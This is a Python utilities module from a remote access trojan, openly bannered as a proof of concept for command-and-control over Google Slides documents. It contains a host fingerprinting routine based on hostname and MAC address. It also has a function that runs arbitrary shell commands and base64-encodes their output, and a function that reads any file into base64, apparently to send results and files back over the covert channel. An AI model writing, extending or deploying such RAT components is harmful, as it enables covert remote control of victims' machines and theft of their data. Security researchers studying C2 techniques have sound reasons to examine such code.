# utils.py
from datetime import datetime
import socket
import subprocess
import uuid
import hashlib
import base64
from colorama import Fore, Back, Style
import time
from modules.config import service_account_info, presentation_id, sleep_time

def print_configuration():
    if service_account_info == None:
        print(Style.BRIGHT+"["+Fore.RED+"-"+Fore.WHITE+"]"+Style.RESET_ALL+" Missing credentials JSON information. Please edit modules/config.py file. ")
        exit()
    print(Style.BRIGHT+"["+Fore.GREEN+"+"+Fore.WHITE+"]"+Style.RESET_ALL+" Polling time: "+Style.BRIGHT+str(sleep_time))
    print(Style.BRIGHT+"["+Fore.GREEN+"+"+Fore.WHITE+"]"+Style.RESET_ALL+" Presentation ID: "+Style.BRIGHT+presentation_id+Style.BRIGHT+"  ("+Fore.BLUE+"https://docs.google.com/presentation/d/"+presentation_id+Fore.WHITE+")\n\n")
    time.sleep(1.5)

def print_banner():
    banner = """
{reset}{red}      ▄████   ██████  ██▀███   {white}
{reset}{red}     ██▒ ▀█▒▒██    ▒ ▓██ ▒ ██▒ {white}         {bold}GOOGLE-SLIDES-RAT - POC
{reset}{red}    ▒██░▄▄▄░░ ▓██▄   ▓██ ░▄█ ▒ {white}
{reset}{red}    ░▓█  ██▓  ▒   ██▒▒██▀▀█▄   {white}         {reset}Infrastructureless Command&Control via Google Slides Documents
{reset}{red}    ░▒▓███▀▒▒██████▒▒░██▓ ▒██▒ {white}
{reset}{red}     ░▒   ▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░ {white}         {bold}Author: {reset}{white}Valerio {green}"MrSaighnal" {white}Alessandroni
{reset}{red}      ░   ░ ░ ░▒  ░ ░  ░▒ ░ ▒░ {white}         {bold}Link: {reset}{blue}https://github.com/MrSaighnal/GSR-Google-Sheets-RAT
{reset}{red}    ░ ░   ░ ░  ░  ░    ░░   ░  {white}
{reset}{red}          ░       ░     ░      {white}                    
                                        
    """.format(white=Fore.WHITE, red=Fore.RED, reset=Style.RESET_ALL, bold=Style.BRIGHT, blue=Fore.BLUE, green=Fore.GREEN)
    print(banner)
    time.sleep(1.5)

def print_terminal_start():
    print(Fore.GREEN+Style.BRIGHT+"Target"+Fore.RED+" $"+Style.RESET_ALL)

def get_current_date_time():
    now = datetime.now()
    return now.strftime("%d-%m-%y %H:%M:%S")

def generate_hash_md5():
    hostname = socket.gethostname()
    mac_address = ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i+2] for i in range(0, 12, 2))
    data = hostname + mac_address
    md5_hash = hashlib.md5(data.encode()).hexdigest()
    print(f"[+] Generated unique ID: {md5_hash}")
    return md5_hash

def execute_command(command):
    print(f"[+] Executing command: '{command}'")
    try:
        output = subprocess.check_output(command, shell=True)
        encoded_output = base64.b64encode(output).decode('utf-8')
        return encoded_output
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during execution: {e}")
        return None

def file_to_base64(file_path):
    """
    Legge il contenuto di un file dal percorso specificato e lo converte in base64.

    Args:
    file_path (str): Il percorso del file da leggere e convertire.

    Returns:
    str: Il contenuto del file codificato in base64.
    """
    try:
        # Apri il file in modalità binaria e leggilo
        with open(file_path, "rb") as file:
            file_content = file.read()
        # Codifica il contenuto del file in base64
        encoded_content = base64.b64encode(file_content)
        # Converte bytes in stringa per la restituzione
        return encoded_content.decode('utf-8')
    except FileNotFoundError:
        return "Errore: il file non è stato trovato."
    except Exception as e:
        return f"Errore: {e}"
